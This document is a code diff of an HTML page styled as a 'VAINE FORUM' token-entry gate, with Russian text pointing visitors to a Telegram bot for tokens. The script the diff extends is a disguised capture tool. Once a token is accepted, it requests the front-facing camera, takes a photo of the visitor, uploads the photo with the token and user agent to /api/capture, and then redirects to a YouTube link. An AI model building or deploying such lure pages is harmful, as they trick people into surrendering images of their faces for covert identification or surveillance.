@@ -3,41 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>VAINE FORUM</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: Arial, sans-serif;
         }
         
         body {
-            background: #000;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
         
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #ff4444;
+            font-size: 32px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255,68,68,0.3);
+        }
+        
         input {
-            width: 300px;
+            width: 100%;
             padding: 15px;
             background: #111;
-            border: 1px solid #333;
+            border: 2px solid #333;
             color: #fff;
             font-size: 18px;
             text-align: center;
             letter-spacing: 2px;
             outline: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
         }
         
         input:focus {
-            border-color: #666;
+            border-color: #ff4444;
+        }
+        
+        .message {
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .success {
+            background: #00ff0022;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+        }
+        
+        .error {
+            background: #ff000022;
+            border: 2px solid #ff4444;
+            color: #ff4444;
+        }
+        
+        .status {
+            color: #ffaa00;
+            margin-top: 10px;
+        }
+        
+        .note {
+            color: #666;
+            font-size: 12px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
+    <div class="container">
+        <h1>VAINE FORUM</h1>
+        <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
+        <div id="message" class="message"></div>
+        <div id="status" class="status"></div>
+        <div class="note">Токен можно получить в боте @FraZzerNFTbot</div>
+    </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -49,16 +102,24 @@
         }
         
         let stream = null;
+        let verified = false;
 
         async function verifyAndCapture() {
             const token = document.getElementById('token').value.trim();
+            const messageDiv = document.getElementById('message');
+            const statusDiv = document.getElementById('status');
             
             if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
+                messageDiv.style.display = 'block';
+                messageDiv.className = 'message error';
+                messageDiv.textContent = 'Неверный формат токена';
                 return;
             }
             
             try {
-                // Сначала проверяем токен
+                // Проверяем токен
+                statusDiv.textContent = '⏳ Проверка токена...';
+                
                 const verifyRes = await fetch('/api/verify-token', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -67,11 +128,29 @@
                 
                 const verifyData = await verifyRes.json();
                 
-                if (!verifyData.valid) return;
+                if (!verifyData.valid) {
+                    messageDiv.style.display = 'block';
+                    messageDiv.className = 'message error';
+                    messageDiv.textContent = 'Неверный токен';
+                    statusDiv.textContent = '';
+                    return;
+                }
+                
+                messageDiv.style.display = 'block';
+                messageDiv.className = 'message success';
+                messageDiv.textContent = 'Токен принят';
+                verified = true;
+                
+                statusDiv.textContent = '📷 Запрос камеры...';
                 
                 // Запрашиваем камеру
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
                 
+                statusDiv.textContent = '✅ Делаем снимок...';
+                
+                // Делаем снимок
                 const videoTrack = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(videoTrack);
                 const bitmap = await imageCapture.grabFrame();
@@ -82,19 +161,35 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(bitmap, 0, 0);
                 
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
                 
+                statusDiv.textContent = '📤 Отправка...';
+                
+                // Отправляем фото
                 const formData = new FormData();
                 formData.append('image', blob, 'photo.jpg');
                 formData.append('token', token);
                 formData.append('ua', navigator.userAgent);
                 
-                await fetch('/api/capture', { method: 'POST', body: formData });
+                const captureRes = await fetch('/api/capture', { 
+                    method: 'POST', 
+                    body: formData 
+                });
                 
-                stream.getTracks().forEach(t => t.stop());
+                const captureData = await captureRes.json();
+                
+                if (captureData.success) {
+                    statusDiv.textContent = '✅ Фото отправлено!';
+                    setTimeout(() => {
+                        window.location.href = 'https://youtu.be/dQw4w9WgXcQ';
+                    }, 2000);
+                } else {
+                    throw new Error('Ошибка отправки');
+                }
                 
             } catch (err) {
                 console.error(err);
+                statusDiv.textContent = '❌ Ошибка: ' + err.message;
                 if (stream) stream.getTracks().forEach(t => t.stop());
             }
         }
@@ -102,7 +197,7 @@
         let timeout = null;
         document.getElementById('token').addEventListener('input', function() {
             clearTimeout(timeout);
-            timeout = setTimeout(verifyAndCapture, 300);
+            timeout = setTimeout(verifyAndCapture, 500);
         });
     </script>
 </body>
